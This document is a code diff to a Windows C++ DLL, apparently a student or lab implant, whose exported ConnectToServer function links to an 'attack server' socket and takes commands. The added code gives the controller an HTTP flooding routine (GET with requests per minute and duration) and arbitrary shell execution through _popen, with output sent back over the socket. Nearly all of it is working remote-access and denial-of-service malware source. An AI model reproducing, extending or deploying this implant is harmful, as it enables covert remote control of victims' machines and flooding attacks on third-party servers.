@@ -6,18 +6,69 @@
 
 #include "pch.h"
 #include <windows.h>
+
 #define SHELLCODELEN	2048
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <synchapi.h>
 
 #include <iostream>
 #include <winsock2.h>
 #include <iphlpapi.h>
+#include <wininet.h>
+#include <chrono>
+#include <thread>
+
+#include <iostream>
+#include <sstream>
+#include <vector>
+
+
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "wininet.lib")
 
 // Mutex name for synchronizing access to the flag file
 const wchar_t* mutexName = L"DC2DLLMutex";
+const char inputParamsSeparator = '|';
+const int ATK_SRV_PORT = 5000;
+const char* ATK_SRV_ADDR = "127.0.0.1";
 
+std::vector<std::string> parseCommand(const std::string& input, char separator) {
+    std::vector<std::string> result;
+    std::istringstream iss(input);
+    std::string token;
+
+    while (std::getline(iss, token, separator)) {
+        result.push_back(token);
+    }
+
+    return result;
+}
+
+
+void showMessageInDLL(const std::string& message) {
+    std::wstring wideMessage(message.begin(), message.end());
+    LPCWSTR wideString = wideMessage.c_str();
+
+    MessageBoxW(NULL, wideString, L"Popup DLL", MB_OK);
+}
+
+
+void PerformHttpGetRequest(const std::string& url, int requestsPerMinute, int numberOfMinutes) {
+    std::string result;
+    int delayBetweenRequests = 60/requestsPerMinute * 1000;
+    int totalRequestCount = requestsPerMinute * numberOfMinutes;
+    HINTERNET hInternet = InternetOpen(L"HTTPGETREQUEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet) {
+        for (int i = 0; i < totalRequestCount; ++i) {
+            HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+            InternetCloseHandle(hConnect);
+            Sleep(delayBetweenRequests);
+        }
+        InternetCloseHandle(hInternet);
+    }
+    
+}
 
 extern "C" __declspec(dllexport) void ConnectToServer() {
 
@@ -39,8 +90,8 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     // Set up server address
     sockaddr_in serverAddress{};
     serverAddress.sin_family = AF_INET;
-    serverAddress.sin_port = htons(5000);
-    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1");
+    serverAddress.sin_port = htons(ATK_SRV_PORT);
+    serverAddress.sin_addr.s_addr = inet_addr(ATK_SRV_ADDR);
 
 
     // Connect to the server
@@ -73,11 +124,56 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
             break;
         }
 
-        if (strcmp(command, "QUIT") == 0) {
+        std::vector<std::string> params = parseCommand(command, inputParamsSeparator);
+
+        std::string action = params[0];
+
+        //Different parsing based on first command (parameters)
+        if (action == "PING") { 
+            // NO PARAMS
+            const char* pong_msg = "PONG";
+            send(clientSocket, pong_msg, strlen(pong_msg), 0);
+        }
+        else if (action == "GET") {
+            // PARAMETERS: URL, REQ/MIN, NUM_MIN
+            // es. GET|http://localhost:80/resource.html|30|1 
+
+            PerformHttpGetRequest(params[1], stoi(params[2]),stoi(params[3]));
+        }
+        else if (action == "CMD") {
+            // PARAMETER: COMMAND
+            std::string cmd = params[1];
+            FILE* commandOutput = _popen(cmd.c_str(), "r");
+            if (commandOutput == nullptr) {
+                std::cerr << "Failed to execute command." << std::endl;
+                continue;
+            }
+
+            while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {
+
+                //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
+                //wchar_t* msg = new wchar_t[size];
+                //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
+                //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
+
+                // Send the output to the socket
+                send(clientSocket, buffer, strlen(buffer), 0);
+            }
+            _pclose(commandOutput);
+            //MessageBoxW(NULL, L"CMD ", L"Popup DLL", MB_OK);
+        }
+        else {
+            // FUTURE IMPL.
+            MessageBoxW(NULL, L"Invalid action", L"Popup DLL", MB_OK);
+        }
+
+        //showMessageInDLL(params[0]);
+
+        if (strcmp(command, "QUIT") == 0) { // dovrebbe esserci?
             break;
         }
 
-        if (command == nullptr || strnlen(command, 1024) == 0) {
+        if (command == nullptr || strnlen(command, 1024) == 0) { //dovrebbe esserci?
             std::cerr << "No command." << std::endl;
             continue;
         }
@@ -86,32 +182,14 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
         //wchar_t* msg = new wchar_t[size];
         //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
         //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
-
-        FILE* commandOutput = _popen(command, "r");
-        if (commandOutput == nullptr) {
-            std::cerr << "Failed to execute command." << std::endl;
-            continue;
-        }
-
-        while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {
-
-            //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
-            //wchar_t* msg = new wchar_t[size];
-            //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
-            //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
-
-            // Send the output to the socket
-            send(clientSocket, buffer, strlen(buffer), 0);
-        }
-
-        _pclose(commandOutput);
-
     }
 
     // Close the socket and cleanup Winsock
     closesocket(clientSocket);
     WSACleanup();
 }
+
+
 
 
 DWORD WINAPI ThreadFunction(LPVOID lpParameter)
@@ -132,7 +210,7 @@ DWORD WINAPI ThreadFunction(LPVOID lpParameter)
     ConnectToServer();
 
     //ReleaseMutex(hMutex);
-    //CloseHandle(hMutex);
+    CloseHandle(hMutex); //gets here if while(true) crashes someway (no try catch structure so far)
 
     return 1;
 }
